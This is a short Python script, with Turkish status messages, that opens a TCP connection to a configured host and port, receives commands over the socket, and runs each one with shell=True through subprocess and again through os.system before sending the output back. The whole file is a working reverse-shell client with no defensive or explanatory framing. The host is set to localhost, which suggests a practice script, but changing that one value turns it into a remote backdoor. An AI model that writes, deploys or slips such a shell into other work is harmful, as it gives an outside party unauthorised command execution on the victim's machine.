import socket
import os
import subprocess

HOST = "127.0.0.1"
PORT = 12345

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((HOST, PORT))
    print("Bağlanıldı")

    

    while True:
        data = sock.recv(4096)
        if not data:
            break

        msg = data.decode(errors="ignore").strip()
        print("Gelen:", msg)
        result = subprocess.run(
	    [str(msg)],
	    capture_output=True,
	    text=True,
	    shell=True
	    )   
        try:
            os.system(msg)

        except Exception as e: 
            print(e)
            
        sock.send((result.stdout + "\n").encode())

except KeyboardInterrupt:
    pass
finally:
    sock.close()
